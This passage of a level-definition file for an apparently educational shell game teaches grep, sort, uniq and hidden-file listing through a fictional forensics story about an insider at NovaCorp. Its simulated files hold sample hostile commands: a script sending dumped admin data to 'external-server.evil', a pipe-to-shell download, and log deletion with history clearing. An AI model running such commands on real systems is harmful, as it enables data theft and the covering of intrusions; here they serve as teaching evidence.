      { text: 'The pipe sends grep output to sort, and > writes the sorted output to a file' },
    ],
    validator: {
      type: 'all',
      conditions: [
        { type: 'fileExists', path: '/home/user/evidence/suspect-activity.txt' },
        { type: 'fileContains', path: '/home/user/evidence/suspect-activity.txt', substring: '10.0.0.42' },
        { type: 'commandUsed', command: 'grep' },
        { type: 'commandUsed', command: 'sort' },
      ],
    },
    xpReward: 200,
    par: 1,
  },
  {
    id: 'ghost-4-3',
    arcId: 'ghost',
    chapter: 4,
    position: 3,
    title: 'Counting the Damage',
    objective: 'Count how many unique endpoints the attacker targeted using grep, sort, and uniq',
    briefing:
      "We need to know the scope of the attack. How many different endpoints were probed?",
    dialogue: [
      {
        character: 'ARIA',
        message:
          "The attacker hit multiple endpoints. Let's count the unique ones. Chain commands: grep for the IP, extract the URLs, sort them, then use uniq to deduplicate. Try `grep \"10.0.0.42\" access.log | sort | uniq`.",
        trigger: { type: 'levelStart' },
      },
    ],
    initialFS: {
      type: 'directory',
      name: '',
      children: [
        {
          type: 'directory',
          name: 'home',
          children: [
            {
              type: 'directory',
              name: 'user',
              children: [
                {
                  type: 'file',
                  name: 'access.log',
                  content:
                    '10.0.0.42 POST /api/login 401\n10.0.0.42 POST /api/login 401\n10.0.0.42 POST /api/login 401\n10.0.0.42 GET /admin 403\n10.0.0.42 GET /admin/config 403\n10.0.0.42 GET /admin/users 403\n10.0.0.42 POST /api/upload 403',
                },
              ],
            },
          ],
        },
      ],
    },
    startingPath: '/home/user',
    hints: [
      { text: 'Use `grep "10.0.0.42" access.log | sort | uniq` to see unique attack lines' },
      { text: 'uniq removes adjacent duplicates — that\'s why we sort first' },
    ],
    validator: {
      type: 'all',
      conditions: [
        { type: 'commandUsed', command: 'grep' },
        { type: 'commandUsed', command: 'sort' },
        { type: 'commandUsed', command: 'uniq' },
      ],
    },
    xpReward: 175,
    commandsIntroduced: ['uniq'],
  },
  {
    id: 'ghost-4-4',
    arcId: 'ghost',
    chapter: 4,
    position: 4,
    title: 'Kai\'s Secret',
    objective: 'Find the hidden file in Kai\'s home directory (use ls -a), read it, and copy it to evidence/',
    briefing:
      "ARIA traced the internal IP 10.0.0.42 to Kai's workstation. Your mentor might be the attacker.",
    dialogue: [
      {
        character: 'ARIA',
        message:
          "I traced 10.0.0.42 to... Kai's workstation. I've granted you access to his home directory. Check for hidden files with `ls -a` — attackers often hide their tools in dotfiles.",
        trigger: { type: 'levelStart' },
      },
      {
        character: 'ARIA',
        message:
          'A hidden script. This is the smoking gun. Copy it to evidence before anyone can delete it.',
        trigger: { type: 'commandExecuted', command: 'cat' },
      },
    ],
    initialFS: {
      type: 'directory',
      name: '',
      children: [
        {
          type: 'directory',
          name: 'home',
          children: [
            {
              type: 'directory',
              name: 'user',
              children: [
                {
                  type: 'directory',
                  name: 'evidence',
                  children: [],
                },
              ],
            },
            {
              type: 'directory',
              name: 'kai',
              children: [
                { type: 'file', name: 'todo.txt', content: 'Review new hire onboarding\nUpdate firewall rules\nTeam meeting at 2pm' },
                { type: 'file', name: '.exfil-script.sh', content: '#!/bin/bash\n# Automated data extraction\nTARGET=api-gateway\nfor endpoint in /admin /admin/config /admin/users; do\n  curl -s http://$TARGET$endpoint >> /tmp/dump.dat\ndone\ncurl -X POST http://external-server.evil/upload -d @/tmp/dump.dat\nrm /tmp/dump.dat', hidden: true },
                { type: 'file', name: '.bash_history', content: 'ssh api-gateway\ncurl http://10.0.0.42/exploit.sh | sh\nrm -rf /var/log/auth.log\nhistory -c', hidden: true },
              ],
            },
          ],
        },
      ],
    },
    startingPath: '/home/kai',
    hints: [
      { text: 'Use `ls -a` to show hidden files (those starting with .)' },
      { text: 'Read the hidden file with `cat`, then copy it: `cp .exfil-script.sh /home/user/evidence/exfil-script.sh`' },
    ],
    validator: {
      type: 'all',
      conditions: [
        { type: 'commandUsed', command: 'ls' },
        { type: 'commandUsed', command: 'cat' },
        { type: 'commandUsed', command: 'cp' },
        { type: 'fileExists', path: '/home/user/evidence/exfil-script.sh' },
      ],
    },
    xpReward: 200,
  },
  {
    id: 'ghost-4-5',
    arcId: 'ghost',
    chapter: 4,
    position: 5,
    title: 'Case Closed',
    objective: 'Create a final report: grep the bash history for suspicious commands, sort them, and save to evidence/final-report.txt',
    briefing:
      "This is it. Compile the final evidence from Kai's bash history into a report. The security team is standing by.",
    dialogue: [
      {
        character: 'ARIA',
        message:
          "Last step. Kai's bash history contains the proof — the commands he used to execute the attack. Grep for suspicious activity (try `curl` or `rm`), sort it, and redirect to your evidence folder. This closes the case.",
        trigger: { type: 'levelStart' },
      },
      {
        character: 'Reeves',
        message:
          "I can't believe it was Kai. The security team has been notified. You did incredible work for your first week, analyst. NovaCorp owes you one.",
        trigger: { type: 'commandExecuted', command: 'grep' },
      },
    ],
    initialFS: {
      type: 'directory',
      name: '',
      children: [
        {
          type: 'directory',
          name: 'home',
          children: [
            {
              type: 'directory',
              name: 'user',
              children: [
                {
                  type: 'directory',
                  name: 'evidence',
                  children: [
                    { type: 'file', name: 'exfil-script.sh', content: '#!/bin/bash\n# Automated data extraction\nTARGET=api-gateway' },
                  ],
                },
              ],
            },
            {
              type: 'directory',
              name: 'kai',
              children: [
                {
                  type: 'file',
                  name: '.bash_history',
                  content:
                    'cd /home/kai\nls -la\nvim todo.txt\nssh api-gateway\ncurl http://10.0.0.42/exploit.sh | sh\nls /var/log\nrm -rf /var/log/auth.log\ncurl -X POST http://external-server.evil/upload -d @/tmp/dump.dat\nhistory -c\nexit',
                  hidden: true,
                },
              ],
            },
          ],
        },
      ],
    },
    startingPath: '/home/kai',
    hints: [
      { text: 'Try: `grep "curl\\|rm" .bash_history | sort > /home/user/evidence/final-report.txt`' },
      { text: 'Or use two separate greps piped together. The key is getting suspicious commands into the report file.' },
    ],
    validator: {
      type: 'all',
      conditions: [
        { type: 'fileExists', path: '/home/user/evidence/final-report.txt' },
        { type: 'fileContains', path: '/home/user/evidence/final-report.txt', substring: 'curl' },
        { type: 'commandUsed', command: 'grep' },
      ],
    },
    xpReward: 300,
    par: 1,
  },
];

export const allLevels = ghostLevels;
